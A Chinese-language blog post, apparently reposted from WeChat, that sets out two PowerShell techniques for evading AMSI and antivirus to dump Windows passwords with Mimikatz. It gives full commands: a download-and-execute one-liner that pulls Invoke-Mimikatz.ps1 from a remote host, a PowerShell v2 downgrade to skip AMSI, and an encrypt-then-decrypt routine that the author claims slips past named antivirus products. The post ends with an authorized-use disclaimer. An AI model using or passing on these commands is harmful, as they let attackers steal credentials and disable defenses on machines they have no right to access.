> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oVWg7WF3609ny8423ROZEw)

  

前言

：

  

今天给大家分享两个利用 powershell 来 bypass 杀软抓密码技巧，亲测目前不杀。  
注：本号首发在了土司 https://www.t00ls.net/thread-62167-1-1.html

  

一.

利用 powershell v2 绕过 amsi 抓 windows 密码（前提是 win10 机器需要. net3.0 以上）

当我们实用原始的 powershell 执行经典的抓密码发现，是被 amsi 阻止的  

```
powershell -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.52.134:6688/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFhwRS0ibiafzkgm53C5uJvicucm2fz9Dt8IkgAzlcBgFjunxIyGbLzzPmVpfkjgx8QoFH0iaZqUKH6xNQ/640?wx_fmt=png)  

此时我们利用降维攻击，强制使用 PowerShell v2 绕过 amsi，因为版本 2 没有支持 AMSI 的必要内部挂钩  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFhwRS0ibiafzkgm53C5uJvicuc6JA92fgTfUVehibibAEyiaN4UNSxvxDY2wWSrv6FW9EjeKUC3uRNVWzLA/640?wx_fmt=png)  

可以看到成功绕过了 amsi 的检测执行成功 mimikatz 抓到了密码！

二.

使用 Out-EncryptedScript 加密免杀抓取密码（亲测目前可绕过某绒和某 60）

Out-EncryptedScript 是 Powersploit 中提供工具的一种，他是用来进行加密处理的脚本，首先我们将 Out-EncryptedScript.ps1 与 Invoke-Mimikatz.ps1 放到同一目录下  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFhwRS0ibiafzkgm53C5uJvicucmLWnOiaW853lMdbEWKibaLNibV45SFzcMLX1l6JF5n4s8Mp87IaPDF6fA/640?wx_fmt=png)

依次执行如下命令  

```
powershell.exe
Import-Module .\Out-EncryptedScript.ps1
Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password tubai -Salt 123456
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFhwRS0ibiafzkgm53C5uJvicucXYHX0A6jfp7hRAHu9MM5pGiabnrk5l1Jboeld99l725dppfLdndBwIg/640?wx_fmt=png)  

目录下便会自动生成 evil.ps1 文件，上传到目标机器即可  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFhwRS0ibiafzkgm53C5uJvicucmLWnOiaW853lMdbEWKibaLNibV45SFzcMLX1l6JF5n4s8Mp87IaPDF6fA/640?wx_fmt=png)  

在目标机器依次执行如下命令  

```
powershell.exe
IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Out-EncryptedScript.ps1")  注：由于https://raw.githubusercontent.com/不稳地，我本人是放在自己的阿里云上的。
[String] $cmd = Get-Content .\evil.ps1
Invoke-Expression $cmd
$decrypted = de tubai 123456
Invoke-Expression $decrypted
Invoke-Mimikatz
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFhwRS0ibiafzkgm53C5uJvicucf7gneOqDoOE0emTpAPxPl6BxDmXdWjLo4hwA8USWdrq05WDv8y7HsA/640?wx_fmt=png)  

如下，便成功绕过了杀软，成功的抓到了密码  

![](https://mmbiz.qpic.cn/mmbiz_png/ibHceSKEmlFhwRS0ibiafzkgm53C5uJvicucgkbOUL2PknzyILoykZ4ZB66AiaQLRqpgu5hOd0SDHSYm85Ec28ZGiaMg/640?wx_fmt=png)  

三

总结：

绕过 AV 的方式层出不穷，powershell 在内网渗透方面利用的方式非常多，远远不止免杀与信息收集，希望大家能在授权的情况下，玩转自己的绕过思路，都能总结出自己的一些 bypass 小技巧！  

声明: 文章初衷仅为攻防研究学习交流之用，严禁利用相关技术去从事一切未经合法授权的入侵攻击破坏活动，因此所产生的一切不良后果与本文作者及该公众号无关

若各位师傅有更多姿势，或想与我一起交流学习，可加我 VX：  

‍‍‍![](https://mmbiz.qpic.cn/mmbiz_jpg/ibHceSKEmlFhwRS0ibiafzkgm53C5uJvicucs5HmyMjhCXBxOpWDWCxC7v5Hj5hu00iaKLSGPmswBRKqm75Mz5XZiaiaw/640?wx_fmt=jpeg)  

分享收藏点赞在看